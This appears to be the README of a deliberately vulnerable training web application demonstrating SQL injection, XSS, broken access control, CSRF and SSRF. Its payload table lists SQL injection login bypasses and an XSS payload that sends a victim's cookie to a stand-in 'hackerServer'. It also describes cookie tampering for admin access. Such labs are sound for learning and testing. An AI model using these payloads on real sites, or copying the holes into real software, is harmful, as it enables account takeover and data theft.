## (VWA) Vulnerable Web Application 🚀

That application demonstrates top 5 (**SQli, XSS, Broken Access Control, CSRF, SSRF**) critical web vulnerabilities. You can run and test them out!

_The whole project consist of mini projects with each vulnerability_

P.S: I tried not to use any databases for simpler and faster installation but for some vulnerabilities it was required such as: **SQli**

---

## Quick Installation

(Go to folder with mini project and do **npm i**)

```plaintext
cd VWA/sqli/1
npm i

cd VWA/xss/1
npm i

cd VWA/xss/hackerServer
npm i
```

If you want to test SQli you need to create **postgresql** database with that credentials

![](https://33333.cdn.cke-cs.com/kSW7V9NHUXugvhoQeFaf/images/bacbbf3d5f416e47b3d1f8b3c3ac4e537c5457ba8868a574.png)

---

## Payloads

| Vulnerability | Payload | Where to Type | What it do |
| --- | --- | --- | --- |
| SQli | ' OR '1' = '1 | Password field | Allow to get all users |
| SQli | admin' -- | Password field | Allow to login only by username |
| XSS | \<svg onload=alert(1)> | PostInfo field | Simple alert |
| XSS | \<svg onload='var i = new Image(); i.src="http://localhost:3001/acceptCookie?cookie="+btoa(document.cookie);'> | PostInfo field | Allow to send user cookie to **hackerServer** website |
| Broken Access Control | Any logged in user can edit **isAdmin** cookie parameter | DevTools Application Cookie | Get access to admin page |
| CSRF | Run hacker server | Send hacker server url to logged in user | Allow hacker make a post on the website if user click the link |
| SSRF | Change hidden input value to **hackerServer** | Show products input | Allow make requests from website server |

---

## To-Do

*   [x] SQli vuln.
*   [x] XSS vuln.
*   [x] Broken Access Control vuln.
*   [x] CSRF vuln.
*   [x] SSRF vuln.
